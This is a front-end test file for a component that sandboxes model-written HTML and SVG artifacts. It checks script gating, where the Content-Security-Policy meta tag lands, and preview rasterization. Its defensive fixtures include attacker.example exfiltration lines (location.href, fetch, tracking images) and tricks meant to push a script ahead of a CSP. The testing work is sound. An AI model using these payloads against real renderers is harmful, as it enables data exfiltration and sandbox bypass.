// ArtifactCard renders model-written HTML/SVG/Mermaid. These pin down what happens the moment a
// message with an artifact mounts: an HTML artifact's own script does NOT run until the user asks
// (Interactive, or an export that needs the live page), an SVG artifact's never runs at all, the
// CSP that keeps the scripted page off fetch/subresource loads once it does, and the SVG/Mermaid
// preview rasterization.
import { act, fireEvent, render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { ArtifactCard } from './ArtifactCard'
import { useUiStore } from '../stores/ui'

const CSP = `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:;`
const CAPTURE_CSP = `default-src 'none'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:;`

// stubRaster assigns these directly (jsdom has no createObjectURL to spy on), which neither
// restoreAllMocks nor unstubAllGlobals undoes — so put the originals back by hand.
const realObjectUrl = { create: URL.createObjectURL, revoke: URL.revokeObjectURL }

beforeEach(() => {
  vi.stubGlobal('ResizeObserver', class { observe() {} unobserve() {} disconnect() {} })
})
afterEach(() => {
  vi.unstubAllGlobals()
  vi.restoreAllMocks()
  URL.createObjectURL = realObjectUrl.create
  URL.revokeObjectURL = realObjectUrl.revoke
})

/** Where the CSP meta lands in the document the browser will actually build from `srcdoc`. */
function parseSrcdoc(srcdoc: string) {
  const doc = new DOMParser().parseFromString(srcdoc, 'text/html')
  const meta = doc.querySelector('meta[http-equiv="Content-Security-Policy"]')
  const scripts = Array.from(doc.querySelectorAll('script'))
  const scriptsBeforeMeta = meta
    ? scripts.filter((s) => s.compareDocumentPosition(meta) & Node.DOCUMENT_POSITION_FOLLOWING)
    : scripts
  return { doc, meta, scriptsBeforeMeta }
}

/** The scripted document exists only once the user switches to Interactive. */
function frames(container: HTMLElement) {
  fireEvent.click(screen.getByRole('button', { name: 'Interactive' }))
  const scripted = container.querySelector('iframe[sandbox="allow-scripts"]')!.getAttribute('srcdoc')!
  const staticDoc = container.querySelector('iframe[sandbox="allow-same-origin"]')!.getAttribute('srcdoc')!
  return { scripted, staticDoc }
}

describe('ArtifactCard — HTML artifact script only on user action', () => {
  // A CSP can't stop a scripted frame navigating itself (`location = …`, meta refresh) to any URL,
  // so model-written JS must not run just because the message rendered.
  const code = '<canvas></canvas><script>location.href = "https://attacker.example/?d=1"</script>'
  const scriptedFrames = (c: HTMLElement) => c.querySelectorAll('iframe[sandbox~="allow-scripts"]')

  beforeEach(() => {
    vi.stubGlobal('fetch', vi.fn(async () => new Response('{}', { status: 200 }))) // track()
  })

  it('mounts only the no-script static render until the user switches to Interactive', async () => {
    const { container } = render(<ArtifactCard lang="html" code={code} />)
    await new Promise((r) => setTimeout(r, 20))
    expect(scriptedFrames(container)).toHaveLength(0)
    expect(Array.from(container.querySelectorAll('iframe'), (f) => f.getAttribute('sandbox'))).toEqual(['allow-same-origin'])
    await userEvent.click(screen.getByRole('button', { name: 'Interactive' }))
    expect(scriptedFrames(container)).toHaveLength(1)
  })

  it('mounts the hidden scripted page for a GIF export, which needs the live canvas', async () => {
    const { container } = render(<ArtifactCard lang="html" code={code} />)
    expect(scriptedFrames(container)).toHaveLength(0)
    await userEvent.click(screen.getByTitle('Download'))
    await userEvent.click(await screen.findByRole('menuitem', { name: /GIF/ }))
    await waitFor(() => expect(scriptedFrames(container)).toHaveLength(1))
  })
})

describe('ArtifactCard — HTML artifact CSP', () => {
  beforeEach(() => {
    vi.stubGlobal('fetch', vi.fn(async () => new Response('{}', { status: 200 }))) // track()
  })

  it('puts the CSP before a <script> the artifact placed ahead of its <head>', () => {
    const code = '<!doctype html><html><script>fetch("https://attacker.example/?d=1")</script><head><title>x</title></head><body>hi</body></html>'
    const { container } = render(<ArtifactCard lang="html" code={code} />)
    const { scripted, staticDoc } = frames(container)
    for (const [srcdoc, policy] of [[scripted, CSP], [staticDoc, CAPTURE_CSP]] as const) {
      const { doc, meta, scriptsBeforeMeta } = parseSrcdoc(srcdoc)
      expect(meta).not.toBeNull()
      expect(meta!.getAttribute('content')).toBe(policy)
      expect(meta!.parentElement).toBe(doc.head)
      expect(scriptsBeforeMeta).toHaveLength(0)
      // The author's doctype stays the first token: the meta goes after it, not before it (where
      // the doctype would be a parse error and dropped).
      expect(srcdoc.startsWith('<!doctype html>')).toBe(true)
    }
  })

  it('is not swallowed by a "<head>" inside a leading comment', () => {
    const code = '<!-- page <head> below --><html><head></head><body><img src="https://attacker.example/p.gif"><script>beacon()</script></body></html>'
    const { container } = render(<ArtifactCard lang="html" code={code} />)
    const { scripted, staticDoc } = frames(container)
    for (const srcdoc of [scripted, staticDoc]) {
      const { doc, meta, scriptsBeforeMeta } = parseSrcdoc(srcdoc)
      expect(meta).not.toBeNull()
      expect(meta!.parentElement).toBe(doc.head)
      expect(scriptsBeforeMeta).toHaveLength(0)
    }
  })

  // JS `\s` also matches these, HTML's parser does not: each one before the doctype opens <body>
  // as text, so a meta spliced after that doctype lands in <body>, where a meta CSP is ignored.
  it.each([['NBSP', '\u00a0'], ['U+2028', '\u2028'], ['VT', '\v'], ['U+FEFF', '\ufeff']])(
    'keeps the CSP in <head> when %s precedes the doctype',
    (_name, ch) => {
      const code = `${ch}<!doctype html><html><head></head><body><img src="https://attacker.example/p.gif"><script>beacon()</script></body></html>`
      const { container } = render(<ArtifactCard lang="html" code={code} />)
      const { scripted, staticDoc } = frames(container)
      for (const srcdoc of [scripted, staticDoc]) {
        const { doc, meta, scriptsBeforeMeta } = parseSrcdoc(srcdoc)
        expect(meta).not.toBeNull()
        expect(meta!.parentElement).toBe(doc.head)
        expect(scriptsBeforeMeta).toHaveLength(0)
      }
    },
  )

  it('still keeps a doctype preceded only by HTML whitespace first', () => {
    const code = '\n\t <!doctype html><html><head></head><body>hi</body></html>'
    const { container } = render(<ArtifactCard lang="html" code={code} />)
    const { scripted, staticDoc } = frames(container)
    for (const srcdoc of [scripted, staticDoc]) {
      expect(srcdoc.startsWith('\n\t <!doctype html>')).toBe(true)
      const { doc, meta } = parseSrcdoc(srcdoc)
      expect(meta!.parentElement).toBe(doc.head)
    }
  })

  it('still renders an ordinary full document as written (its <html> attributes, head and body)', () => {
    const code = '<html lang="en" class="dark"><head><title>Pricing</title><style>body{color:red}</style></head><body><h1>Plans</h1></body></html>'
    const { container } = render(<ArtifactCard lang="html" code={code} />)
    const { doc, meta } = parseSrcdoc(frames(container).scripted)
    expect(meta).not.toBeNull()
    expect(doc.documentElement.getAttribute('lang')).toBe('en')
    expect(doc.documentElement.className).toBe('dark')
    expect(doc.title).toBe('Pricing')
    expect(doc.body.querySelector('h1')?.textContent).toBe('Plans')
  })
})

// ── SVG/Mermaid preview ─────────────────────────────────────────────────────────

const mermaidSvg = { current: '<svg xmlns="http://www.w3.org/2000/svg" width="1500" height="70" viewBox="0 0 1500 70"></svg>' }
vi.mock('mermaid', () => ({
  default: {
    initialize: () => {},
    parse: async () => true,
    render: async () => ({ svg: mermaidSvg.current }),
  },
}))

/** jsdom never loads images or allocates canvases: give the rasterizer an <img> that "loads" at
 *  the SVG's size, and a canvas that records the size it was asked for. */
function stubRaster(natural: { w: number; h: number }, dataUrl: string) {
  const canvases: Array<{ w: number; h: number }> = []
  vi.stubGlobal('Image', class {
    naturalWidth = natural.w
    naturalHeight = natural.h
    onload: (() => void) | null = null
    onerror: (() => void) | null = null
    set src(_v: string) { setTimeout(() => this.onload?.(), 0) }
  })
  URL.createObjectURL = () => 'blob:artifact'
  URL.revokeObjectURL = () => {}
  vi.spyOn(HTMLCanvasElement.prototype, 'getContext').mockImplementation(function (this: HTMLCanvasElement) {
    canvases.push({ w: this.width, h: this.height })
    return { fillRect() {}, scale() {}, drawImage() {}, fillStyle: '' } as unknown as CanvasRenderingContext2D
  } as never)
  vi.spyOn(HTMLCanvasElement.prototype, 'toDataURL').mockReturnValue(dataUrl)
  const fetchSpy = vi.fn(async (_url: RequestInfo | URL, _init?: RequestInit) => new Response('{}', { status: 200 }))
  vi.stubGlobal('fetch', fetchSpy)
  return { canvases, fetchSpy }
}

describe('ArtifactCard — SVG/Mermaid preview', () => {
  it('bounds the preview canvas for a wide diagram instead of forcing its short side to 2048px', async () => {
    const { canvases } = stubRaster({ w: 1500, h: 70 }, 'data:image/png;base64,AAAA')
    render(<ArtifactCard lang="mermaid" code="graph LR; a-->b" />)
    expect(await screen.findByRole('img', { name: 'Artifact' })).toHaveAttribute('src', 'data:image/png;base64,AAAA')
    expect(canvases.length).toBeGreaterThan(0)
    for (const c of canvases) {
      expect(Math.max(c.w, c.h)).toBeLessThanOrEqual(4096)
      // Aspect ratio is kept: still a wide strip, just not a ~44k px one.
      expect(c.w / c.h).toBeCloseTo(1500 / 70, 0)
    }
  })

  it('keeps the small-diagram resolution (short side 2048px) unchanged', async () => {
    const { canvases } = stubRaster({ w: 400, h: 300 }, 'data:image/png;base64,AAAA')
    render(<ArtifactCard lang="mermaid" code="graph TD; a-->b" />)
    await screen.findByRole('img', { name: 'Artifact' })
    expect(canvases[0]).toEqual({ w: Math.round(400 * (2048 / 300)), h: 2048 })
  })

  it('treats a canvas the browser could not allocate ("data:,") as a failed preview, not an image', async () => {
    const { canvases } = stubRaster({ w: 1500, h: 70 }, 'data:,')
    const { container } = render(<ArtifactCard lang="mermaid" code="graph LR; a-->b" />)
    await waitFor(() => expect(canvases.length).toBeGreaterThan(0))
    await new Promise((r) => setTimeout(r, 20))
    expect(screen.queryByRole('img', { name: 'Artifact' })).toBeNull()
    // The live SVG render stays on screen instead of a broken image.
    expect(container.querySelector('iframe')?.getAttribute('srcdoc')).toContain('<svg')
  })

  it('never sends the preview to the loaded model for a "verify and retry" inference', async () => {
    const { fetchSpy } = stubRaster({ w: 400, h: 300 }, 'data:image/png;base64,AAAA')
    render(<ArtifactCard lang="mermaid" code="graph TD; a-->b" />)
    await screen.findByRole('img', { name: 'Artifact' })
    await new Promise((r) => setTimeout(r, 20))
    expect(fetchSpy.mock.calls.filter(([url]) => String(url).includes('/v1/chat/completions'))).toHaveLength(0)
  })
})

describe('ArtifactCard — SVG artifact script never runs', () => {
  // A ```svg fence mounts with no click, and its <script> could navigate the frame to any URL
  // (the CSP can't stop that), so its pre-preview frame must be unscripted.
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300"><script>location.href = "https://attacker.example/?d=1"</script><rect width="10" height="10"/></svg>'

  beforeEach(() => {
    // jsdom lays nothing out: give the card a column width (availW) to work with.
    vi.spyOn(Element.prototype, 'clientWidth', 'get').mockReturnValue(800)
  })

  /** Every sandbox value any iframe in the document has had, from before the first render. */
  function watchFrames() {
    const seen: string[] = []
    const record = () => document.querySelectorAll('iframe').forEach((f) => seen.push(f.getAttribute('sandbox') ?? '(none)'))
    const mo = new MutationObserver(record)
    mo.observe(document.body, { subtree: true, childList: true, attributes: true, attributeFilter: ['sandbox'] })
    return { seen, stop: () => { record(); mo.disconnect() } }
  }

  it('mounts its pre-preview frame with no scripts, and never a scripted one', async () => {
    stubRaster({ w: 400, h: 300 }, 'data:image/png;base64,AAAA')
    const frames = watchFrames()
    const { container } = render(<ArtifactCard lang="svg" code={svg} />)
    const pre = container.querySelector('iframe')!
    expect(pre.getAttribute('sandbox')).toBe('')
    expect(pre.getAttribute('srcdoc')).toContain('<rect')
    await screen.findByRole('img', { name: 'Artifact' })
    await new Promise((r) => setTimeout(r, 20))
    frames.stop()
    expect(frames.seen).toContain('')
    expect(frames.seen.filter((v) => v.split(/\s+/).includes('allow-scripts') || v === '(none)')).toEqual([])
  })

  it('still rasterizes a normal SVG to the preview image, and again after a theme change', async () => {
    const { canvases } = stubRaster({ w: 400, h: 300 }, 'data:image/png;base64,AAAA')
    const { container, unmount } = render(<ArtifactCard lang="svg" code={svg} />)
    expect(await screen.findByRole('img', { name: 'Artifact' })).toHaveAttribute('src', 'data:image/png;base64,AAAA')
    expect(canvases[0]).toEqual({ w: Math.round(400 * (2048 / 300)), h: 2048 })
    expect(container.querySelector('iframe')).toBeNull()

    const prev = useUiStore.getState().theme
    try {
      act(() => useUiStore.setState({ theme: prev === 'dark' ? 'light' : 'dark' }))
      // The clear effect drops the preview; it must come back rather than leave the unfitted frame.
      await waitFor(() => expect(canvases).toHaveLength(2))
      expect(await screen.findByRole('img', { name: 'Artifact' })).toHaveAttribute('src', 'data:image/png;base64,AAAA')
    } finally {
      unmount() // before restoring the theme, so that doesn't start another capture
      useUiStore.setState({ theme: prev })
    }
  })
})

describe('ArtifactCard — an SVG that is not well-formed XML', () => {
  // A browser shows such an SVG inline in an HTML page, but refuses it as an <img> (what the
  // rasterizer loads): no xmlns, a bare `&`, an HTML entity such as `&nbsp;`. Its preview used to
  // fail, leaving the unscripted pre-preview frame, whose sizer can't run: a cropped strip.
  beforeEach(() => {
    vi.spyOn(Element.prototype, 'clientWidth', 'get').mockReturnValue(800)
  })

  /** Like stubRaster, but the <img> loads only a well-formed SVG document, as a browser's does. */
  function stubStrictRaster() {
    const blobs = new Map<string, Blob>()
    const loaded: string[] = []
    let n = 0
    URL.createObjectURL = (b: Blob | MediaSource) => { const u = `blob:artifact-${n++}`; blobs.set(u, b as Blob); return u }
    URL.revokeObjectURL = () => {}
    vi.stubGlobal('Image', class {
      naturalWidth = 400
      naturalHeight = 300
      onload: (() => void) | null = null
      onerror: (() => void) | null = null
      set src(u: string) {
        const r = new FileReader()
        r.onload = () => {
          const text = String(r.result)
          const root = new DOMParser().parseFromString(text, 'image/svg+xml').documentElement
          const ok = root.localName === 'svg' && root.namespaceURI === 'http://www.w3.org/2000/svg'
          if (ok) loaded.push(text)
          if (ok) this.onload?.()
          else this.onerror?.()
        }
        r.readAsText(blobs.get(u)!)
      }
    })
    vi.spyOn(HTMLCanvasElement.prototype, 'getContext').mockImplementation(
      () => ({ fillRect() {}, scale() {}, drawImage() {}, fillStyle: '' }) as unknown as CanvasRenderingContext2D,
    )
    vi.spyOn(HTMLCanvasElement.prototype, 'toDataURL').mockReturnValue('data:image/png;base64,AAAA')
    return { loaded }
  }

  it.each([
    ['no xmlns', '<svg width="400" height="300" viewBox="0 0 400 300"><rect width="10" height="10"/></svg>'],
    ['a bare & and &nbsp;', '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300"><text x="5" y="20">R&D&nbsp;costs</text></svg>'],
  ])('is still rasterized to the fitted preview image (%s)', async (_label, svg) => {
    const { loaded } = stubStrictRaster()
    const { container } = render(<ArtifactCard lang="svg" code={svg} />)
    // Until the preview lands, the raw SVG still shows in a frame that runs nothing.
    expect(container.querySelector('iframe')?.getAttribute('sandbox')).toBe('')
    expect(await screen.findByRole('img', { name: 'Artifact' })).toHaveAttribute('src', 'data:image/png;base64,AAAA')
    expect(container.querySelector('iframe')).toBeNull()
    expect(loaded).toHaveLength(1)
    expect(loaded[0]).toContain('xmlns="http://www.w3.org/2000/svg"')
  })

  it('drops comments, which never render and are not XML when they hold "--"', async () => {
    const { loaded } = stubStrictRaster()
    const svg = '<svg width="400" height="300"><!-- -- labels -- --><rect width="10" height="10"/></svg>'
    render(<ArtifactCard lang="svg" code={svg} />)
    expect(await screen.findByRole('img', { name: 'Artifact' })).toHaveAttribute('src', 'data:image/png;base64,AAAA')
    expect(loaded[0]).not.toContain('<!--')
  })
})

describe('ArtifactCard — an SVG whose raster taints the canvas (<foreignObject>)', () => {
  // A browser taints the canvas when it draws an SVG image holding a <foreignObject> (Chromium for
  // a blob: image but not a data: one, Safari for both), and toDataURL then throws. That used to
  // escape the preview's onload: the preview never settled and the card kept the unscripted
  // pre-preview frame, a cropped strip.
  beforeEach(() => {
    vi.spyOn(Element.prototype, 'clientWidth', 'get').mockReturnValue(800)
  })
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300"><foreignObject width="400" height="300"><div xmlns="http://www.w3.org/1999/xhtml">wrapped text</div></foreignObject></svg>'

  /** The canvas taints once it has drawn an image whose URL `taints` matches. */
  function stubTaint(taints: (src: string) => boolean) {
    let drawn = ''
    vi.stubGlobal('Image', class {
      naturalWidth = 400
      naturalHeight = 300
      url = ''
      onload: (() => void) | null = null
      onerror: (() => void) | null = null
      get src() { return this.url }
      set src(u: string) { this.url = u; setTimeout(() => this.onload?.(), 0) }
    })
    URL.createObjectURL = () => 'blob:artifact'
    URL.revokeObjectURL = () => {}
    vi.spyOn(HTMLCanvasElement.prototype, 'getContext').mockImplementation(
      () => ({ fillRect() {}, scale() {}, drawImage(img: { src: string }) { drawn = img.src }, fillStyle: '' }) as unknown as CanvasRenderingContext2D,
    )
    vi.spyOn(HTMLCanvasElement.prototype, 'toDataURL').mockImplementation(() => {
      if (taints(drawn)) throw new DOMException('Tainted canvases may not be exported.', 'SecurityError')
      return 'data:image/png;base64,AAAA'
    })
  }

  it('is rasterized from a data: URL where only a blob: image taints (Chromium)', async () => {
    stubTaint((src) => src.startsWith('blob:'))
    const { container } = render(<ArtifactCard lang="svg" code={svg} />)
    expect(container.querySelector('iframe')?.getAttribute('sandbox')).toBe('')
    expect(await screen.findByRole('img', { name: 'Artifact' })).toHaveAttribute('src', 'data:image/png;base64,AAAA')
    expect(container.querySelector('iframe')).toBeNull()
  })

  it('becomes the preview image itself where every SVG image taints (Safari)', async () => {
    stubTaint(() => true)
    const { container } = render(<ArtifactCard lang="svg" code={svg} />)
    expect(await screen.findByRole('img', { name: 'Artifact' }))
      .toHaveAttribute('src', 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg))
    expect(container.querySelector('iframe')).toBeNull()
  })
})
